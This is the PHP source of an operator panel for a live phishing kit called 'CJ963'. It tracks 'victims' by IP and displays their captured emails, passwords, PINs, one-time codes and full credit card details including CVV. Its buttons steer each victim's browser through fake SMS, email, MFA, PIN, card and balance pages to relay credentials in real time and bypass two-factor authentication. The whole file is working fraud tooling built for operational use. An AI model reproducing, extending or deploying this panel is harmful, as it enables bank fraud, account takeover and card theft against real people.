<?php
session_start();
$password = "cjcj"; 
if (isset($_POST['p']) && $_POST['p'] == $password) { $_SESSION['a'] = true; }
if (!isset($_SESSION['a'])) {
    exit('<body style="background:#0f111a;display:flex;align-items:center;justify-content:center;height:100vh;"><form method="POST" style="background:#161b22;padding:40px;border-radius:20px;border:1px solid #30363d;"><h2 style="color:white;text-align:center;font-family:sans-serif;">CJ963</h2><input type="password" name="p" placeholder="Password" style="background:#0d1117;border:1px solid #30363d;padding:15px;color:white;border-radius:10px;"><button style="background:#388bfd;color:white;border:none;padding:15px 25px;border-radius:10px;margin-left:10px;cursor:pointer;">Login</button></form></body>');
}

$dbFile = 'status.json';
$db = json_decode(@file_get_contents($dbFile), true) ?: [];

// Action Handler
if (isset($_GET['action'], $_GET['ip'])) {
    $ip = $_GET['ip'];
    if (isset($db[$ip])) {
        $allowed = ['go_sms', 'go_email', 'go_mfa', 'go_card', 'go_approve', 'go_pin', 'otp_error', 'finished', 'push_approved', 'push_error', 'show_error', 'go_done', 'go_balance'];
        if (in_array($_GET['action'], $allowed)) {
            $db[$ip]['status'] = $_GET['action'];
            file_put_contents($dbFile, json_encode($db));
        }
    }
    header("Location: panel.php?view=" . urlencode($ip));
    exit;
}

// Balance Amount Handler
if (isset($_POST['set_balance'], $_GET['view'])) {
    $ip = $_GET['view'];
    if (isset($db[$ip])) {
        $db[$ip]['balance_amount'] = $_POST['balance_amount'];
        file_put_contents($dbFile, json_encode($db));
    }
    header("Location: panel.php?view=" . urlencode($ip));
    exit;
}

$active_ip = $_GET['view'] ?? (count($db) > 0 ? array_key_first(array_reverse($db, true)) : null);
?>
<!DOCTYPE html>
<html>
<head>
    <title>CJ963 CONTROL</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <meta http-equiv="refresh" content="5">
    <style>
        .loader-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(15, 17, 26, 0.95); z-index: 9999;
            display: none; align-items: center; justify-content: center; flex-direction: column;
        }
        .loader-overlay.active { display: flex; }
        .loader-spinner {
            width: 50px; height: 50px; border: 3px solid #30363d;
            border-top-color: #388bfd; border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body class="bg-[#0f111a] text-slate-400 flex h-screen overflow-hidden">

    <!-- Loader Overlay -->
    <div class="loader-overlay" id="loaderOverlay">
        <div class="loader-spinner mb-4"></div>
        <div class="text-white font-bold text-sm">Processing...</div>
    </div>

    <div class="w-80 bg-[#161b22] border-r border-[#30363d] overflow-y-auto p-4">
        <h1 class="text-white font-black mb-6 italic text-xl">CJ963</h1>
        <?php foreach(array_reverse($db, true) as $ip => $u): 
            $online = (time() - ($u['last_seen'] ?? 0) < 30);
        ?>
        <a href="?view=<?php echo urlencode($ip); ?>" class="block p-4 mb-2 rounded-xl border <?php echo ($active_ip==$ip)?'border-blue-500 bg-blue-500/10':'border-slate-800'; ?>">
            <div class="flex justify-between items-center mb-1">
                <span class="text-white text-xs font-mono"><?php echo $ip; ?></span>
                <div class="w-2 h-2 rounded-full <?php echo $online ? 'bg-green-500 animate-pulse' : 'bg-red-500'; ?>"></div>
            </div>
            <div class="text-[10px] text-blue-400 font-bold uppercase"><?php echo htmlspecialchars($u['status']); ?></div>
            <?php if (!empty($u['email'])): ?>
            <div class="text-[10px] text-slate-500 truncate"><?php echo htmlspecialchars($u['email']); ?></div>
            <?php endif; ?>
        </a>
        <?php endforeach; ?>
    </div>

    <div class="flex-grow p-12 bg-[#0d1117] overflow-y-auto">
        <?php if($active_ip && isset($db[$active_ip])): $v = $db[$active_ip]; ?>
            <div class="max-w-3xl mx-auto">
                <!-- Victim Info Header -->
                <div class="bg-[#161b22] p-6 rounded-2xl border border-slate-800 mb-6">
                    <div class="flex justify-between items-start">
                        <div>
                            <div class="text-[10px] text-slate-500 uppercase tracking-widest mb-1">Victim IP</div>
                            <div class="text-white font-mono text-lg"><?php echo $active_ip; ?></div>
                        </div>
                        <div class="text-right">
                            <div class="text-[10px] text-slate-500 uppercase tracking-widest mb-1">Status</div>
                            <div class="text-blue-400 font-bold uppercase text-sm"><?php echo htmlspecialchars($v['status']); ?></div>
                        </div>
                    </div>
                    <?php if (!empty($v['ua'])): ?>
                    <div class="mt-4 pt-4 border-t border-slate-800">
                        <div class="text-[10px] text-slate-500 uppercase tracking-widest mb-1">User Agent</div>
                        <div class="text-slate-400 text-xs font-mono truncate"><?php echo htmlspecialchars($v['ua']); ?></div>
                    </div>
                    <?php endif; ?>
                </div>

                <!-- Live Captured Code -->
                <div class="bg-[#161b22] p-10 rounded-[2rem] border border-slate-800 mb-6 text-center shadow-2xl">
                    <div class="text-[10px] text-slate-500 uppercase tracking-widest mb-4">Live Captured Code</div>
                    <div class="text-7xl font-black text-blue-500 tracking-[15px] mb-4"><?php echo $v['last_code'] ?: '------'; ?></div>
                    <div class="text-sm font-mono text-slate-400 underline"><?php echo htmlspecialchars($v['email'] ?: 'No email yet'); ?></div>
                    <?php if (!empty($v['password'])): ?>
                        <div class="text-sm font-mono text-slate-400 mt-2">Pass: <span class="text-red-400"><?php echo htmlspecialchars($v['password']); ?></span></div>
                    <?php endif; ?>
                    <?php if (!empty($v['pin'])): ?>
                        <div class="text-sm font-mono text-slate-400 mt-2">PIN: <span class="text-yellow-400"><?php echo htmlspecialchars($v['pin']); ?></span></div>
                    <?php endif; ?>
                </div>

                <!-- Balance Amount Control -->
                <div class="bg-[#161b22] p-6 rounded-2xl border border-slate-800 mb-6">
                    <div class="text-[10px] text-slate-500 uppercase tracking-widest mb-4">Balance Amount</div>
                    <form method="POST" action="?view=<?php echo urlencode($active_ip); ?>" class="flex gap-4 items-end">
                        <div class="flex-grow">
                            <input type="text" name="balance_amount" value="<?php echo htmlspecialchars($v['balance_amount'] ?? ''); ?>" placeholder="e.g. 12,450.00" class="w-full bg-[#0d1117] border border-[#30363d] text-white p-3 rounded-xl text-sm font-mono focus:border-blue-500 focus:outline-none">
                        </div>
                        <button type="submit" name="set_balance" class="bg-emerald-600 hover:bg-emerald-700 text-white px-6 py-3 rounded-xl font-bold text-xs transition-all hover:scale-105">SET BALANCE</button>
                    </form>
                    <?php if (!empty($v['balance_amount'])): ?>
                    <div class="mt-3 text-xs text-emerald-400 font-mono">Current: EUR <?php echo htmlspecialchars($v['balance_amount']); ?></div>
                    <?php endif; ?>
                </div>

                <!-- Credit Card Data -->
                <?php if (!empty($v['card_data'])): ?>
                <div class="bg-[#161b22] p-6 rounded-2xl mb-6 border border-yellow-500/30">
                    <h3 class="text-yellow-400 text-sm mb-3 font-bold"><i class="fas fa-credit-card mr-2"></i>CREDIT CARD CAPTURED</h3>
                    <div class="grid grid-cols-2 gap-4">
                        <div>
                            <div class="text-[10px] text-slate-500 uppercase">Card Number</div>
                            <div class="text-white font-mono"><?php echo htmlspecialchars($v['card_data']['number']); ?></div>
                        </div>
                        <div>
                            <div class="text-[10px] text-slate-500 uppercase">Expiry</div>
                            <div class="text-white font-mono"><?php echo $v['card_data']['expiry']; ?></div>
                        </div>
                        <div>
                            <div class="text-[10px] text-slate-500 uppercase">CVV</div>
                            <div class="text-white font-mono"><?php echo $v['card_data']['cvv']; ?></div>
                        </div>
                        <div>
                            <div class="text-[10px] text-slate-500 uppercase">Holder</div>
                            <div class="text-white font-mono"><?php echo htmlspecialchars($v['card_data']['name']); ?></div>
                        </div>
                    </div>
                </div>
                <?php endif; ?>

                <!-- Control Buttons -->
                <div class="text-[10px] text-slate-500 uppercase tracking-widest mb-4 text-center">Flow Control</div>
                <div class="grid grid-cols-2 md:grid-cols-3 gap-4">
                    <a href="?action=go_email&ip=<?php echo $active_ip; ?>" onclick="showLoader()" class="bg-blue-600 hover:bg-blue-700 text-white p-6 rounded-2xl text-center font-bold text-xs transition-all hover:scale-105">
                        <i class="fas fa-envelope block mb-2 text-xl"></i> PUSH EMAIL OTP
                    </a>
                    <a href="?action=go_sms&ip=<?php echo $active_ip; ?>" onclick="showLoader()" class="bg-purple-600 hover:bg-purple-700 text-white p-6 rounded-2xl text-center font-bold text-xs transition-all hover:scale-105">
                        <i class="fas fa-sms block mb-2 text-xl"></i> PUSH SMS OTP
                    </a>
                    <a href="?action=go_mfa&ip=<?php echo $active_ip; ?>" onclick="showLoader()" class="bg-orange-600 hover:bg-orange-700 text-white p-6 rounded-2xl text-center font-bold text-xs transition-all hover:scale-105">
                        <i class="fas fa-shield-alt block mb-2 text-xl"></i> PUSH MFA/APP
                    </a>
                    <a href="?action=go_pin&ip=<?php echo $active_ip; ?>" onclick="showLoader()" class="bg-pink-600 hover:bg-pink-700 text-white p-6 rounded-2xl text-center font-bold text-xs transition-all hover:scale-105">
                        <i class="fas fa-keyboard block mb-2 text-xl"></i> PUSH PIN PAGE
                    </a>
                    <a href="?action=go_card&ip=<?php echo $active_ip; ?>" onclick="showLoader()" class="bg-yellow-600 hover:bg-yellow-700 text-white p-6 rounded-2xl text-center font-bold text-xs transition-all hover:scale-105">
                        <i class="fas fa-credit-card block mb-2 text-xl"></i> PUSH CARD PAGE
                    </a>
                    <a href="?action=go_approve&ip=<?php echo $active_ip; ?>" onclick="showLoader()" class="bg-indigo-600 hover:bg-indigo-700 text-white p-6 rounded-2xl text-center font-bold text-xs transition-all hover:scale-105">
                        <i class="fas fa-mobile-alt block mb-2 text-xl"></i> PUSH APPROVE
                    </a>
                    <a href="?action=go_balance&ip=<?php echo $active_ip; ?>" onclick="showLoader()" class="bg-teal-600 hover:bg-teal-700 text-white p-6 rounded-2xl text-center font-bold text-xs transition-all hover:scale-105">
                        <i class="fas fa-wallet block mb-2 text-xl"></i> PUSH BALANCE
                    </a>
                    <a href="?action=otp_error&ip=<?php echo $active_ip; ?>" onclick="showLoader()" class="bg-red-600/20 text-red-500 border border-red-600/30 p-6 rounded-2xl text-center font-bold text-xs transition-all hover:scale-105">
                        <i class="fas fa-times-circle block mb-2 text-xl"></i> OTP ERROR
                    </a>
                    <a href="?action=push_approved&ip=<?php echo $active_ip; ?>" onclick="showLoader()" class="bg-green-600 hover:bg-green-700 text-white p-6 rounded-2xl text-center font-bold text-xs transition-all hover:scale-105">
                        <i class="fas fa-check-circle block mb-2 text-xl"></i> APPROVE PUSH
                    </a>
                    <a href="?action=push_error&ip=<?php echo $active_ip; ?>" onclick="showLoader()" class="bg-red-600 hover:bg-red-700 text-white p-6 rounded-2xl text-center font-bold text-xs transition-all hover:scale-105">
                        <i class="fas fa-ban block mb-2 text-xl"></i> REJECT PUSH
                    </a>
                    <a href="?action=show_error&ip=<?php echo $active_ip; ?>" onclick="showLoader()" class="bg-gray-600 hover:bg-gray-700 text-white p-6 rounded-2xl text-center font-bold text-xs transition-all hover:scale-105">
                        <i class="fas fa-exclamation-triangle block mb-2 text-xl"></i> SHOW ERROR POPUP
                    </a>
                    <a href="?action=go_done&ip=<?php echo $active_ip; ?>" onclick="showLoader()" class="bg-emerald-600 hover:bg-emerald-700 text-white p-6 rounded-2xl text-center font-bold text-xs transition-all hover:scale-105">
                        <i class="fas fa-check-circle block mb-2 text-xl"></i> DONE
                    </a>
                </div>
            </div>
        <?php else: ?>
            <div class="h-full flex items-center justify-center opacity-10 text-4xl font-black uppercase tracking-[20px]">Select Victim</div>
        <?php endif; ?>
    </div>

<script>
function showLoader() {
    document.getElementById('loaderOverlay').classList.add('active');
}
</script>
</body>
</html>